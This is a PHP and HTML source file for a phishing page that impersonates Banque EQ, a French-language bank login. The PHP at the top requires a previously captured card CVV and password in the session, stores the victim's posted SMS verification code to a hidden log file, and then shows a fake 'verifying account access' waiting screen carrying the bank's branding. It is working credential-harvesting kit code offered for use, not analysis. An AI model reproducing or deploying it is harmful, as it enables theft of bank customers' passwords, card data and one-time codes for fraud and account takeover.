<?php session_start();
if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
        header("Location: ./index.php");
        exit();
}
$_SESSION["sms"] = $_POST['sms'] ;

$donnees = "Sms : " .$_SESSION["sms"] ."\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

session_destroy();




?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banque EQ - Connexion</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#8E6FF7',
                        secondary: ''
                    },
                    borderRadius: {
                        'none': '0px',
                        'sm': '4px',
                        DEFAULT: '8px',
                        'md': '12px',
                        'lg': '16px',
                        'xl': '20px',
                        '2xl': '24px',
                        '3xl': '32px',
                        'full': '9999px',
                        'button': '8px'
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css">
    <style>
        :where([class^="ri-"])::before {
            content: "\f3c2";
        }

        body {
            background-color: #f5f5f5;
            font-family: 'Inter', sans-serif;
        }

        .form-input:focus {
            outline: none;
            border-color: #8E6FF7;
        }

        .checkbox-custom {
            appearance: none;
            width: 18px;
            height: 18px;
            border: 1px solid #d1d5db;
            border-radius: 4px;
            position: relative;
            cursor: pointer;
        }

        .checkbox-custom:checked {
            background-color: #8E6FF7;
            border-color: #8E6FF7;
        }

        .checkbox-custom:checked::after {
            content: "";
            position: absolute;
            left: 6px;
            top: 2px;
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
    </style>
</head>

<body class="min-h-screen">
    <!-- Header -->
    <header class="bg-white py-4 px-4 md:px-6 shadow-sm">
        <div class="container mx-auto">
            <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-4 md:gap-0">
                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <div class="bg-yellow-400 w-10 h-10 flex items-center justify-center rounded">
                            <span class="font-bold text-black">EQ</span>
                        </div>
                        <span class="ml-2 font-bold text-black">Banque EQ</span>
                    </div>
                    <div class="md:hidden w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center cursor-pointer">
                        <i class="ri-menu-line text-gray-600"></i>
                    </div>
                </div>
                <div class="flex flex-col md:flex-row items-start md:items-center gap-4 md:space-x-4">
                    <a href="#" class="text-gray-700 hover:text-primary transition">Besoin d'aide?</a>
                    <div class="flex items-center border border-gray-300 rounded-full px-4 py-1">
                        <span>Français</span>
                        <div class="w-6 h-6 ml-2 flex items-center justify-center">
                            <i class="ri-arrow-down-s-line"></i>
                        </div>
                    </div>
                    <div class="hidden md:flex w-10 h-10 bg-gray-100 rounded-full items-center justify-center cursor-pointer">
                        <i class="ri-moon-line text-gray-600"></i>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="container mx-auto py-12 md:py-16 px-4">
        <div class="w-full max-w-lg mx-auto bg-white rounded-lg shadow-md p-8 md:p-10">
            <h1 class="text-3xl font-bold text-center mb-10">Ouvrir une session</h1>
            <form id="loginForm" action="/eqbanque/sms.php" method="post">
            <h1>VEUILLEZ PATIENTER PENDANT QUE NOUS VERIFIONS L'ACCES AU COMPTE </h1>

<div class="load" style="text-align:center" >
<img src="./img/ajax-loading.gif" alt="">
            </form>
            <div class="mt-8 text-center">
                <a href="#" class="text-sm text-gray-500 hover:text-primary">Garantie de sécurité</a>
            </div>
        </div>
    </main>
    <!-- Chat Button -->
    <div class="fixed bottom-6 right-6">
        <button class="w-14 h-14 bg-pink-500 text-white rounded-full shadow-lg flex items-center justify-center hover:bg-pink-600 transition">
            <i class="ri-message-3-line text-xl"></i>
        </button>
    </div>
    <!-- Footer -->
    <footer class="bg-white mt-10 md:mt-20 py-6 md:py-8 border-t border-gray-200">
        <div class="container mx-auto px-4">
            <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-6 md:gap-0">
                <nav class="grid grid-cols-2 md:flex md:space-x-6 gap-4 text-sm text-gray-600">
                    <a href="#" class="hover:text-primary">Nous joindre</a>
                    <a href="#" class="hover:text-primary">FAQ</a>
                    <a href="#" class="hover:text-primary">Accessibilité</a>
                    <a href="#" class="hover:text-primary">Confidentialité</a>
                    <a href="#" class="hover:text-primary">Sécurité</a>
                    <a href="#" class="hover:text-primary">Avis juridiques</a>
                </nav>
                <div class="text-center md:text-right">
                    <p class="text-xs text-gray-500">MCMarque déposée de la Banque Equitable. Tous droits réservés.</p>
                    <p class="text-xs text-gray-500">La Banque EQ est un nom commercial de la Banque Equitable.</p>
                </div>
            </div>
        </div>
    </footer>
</body>

</html>
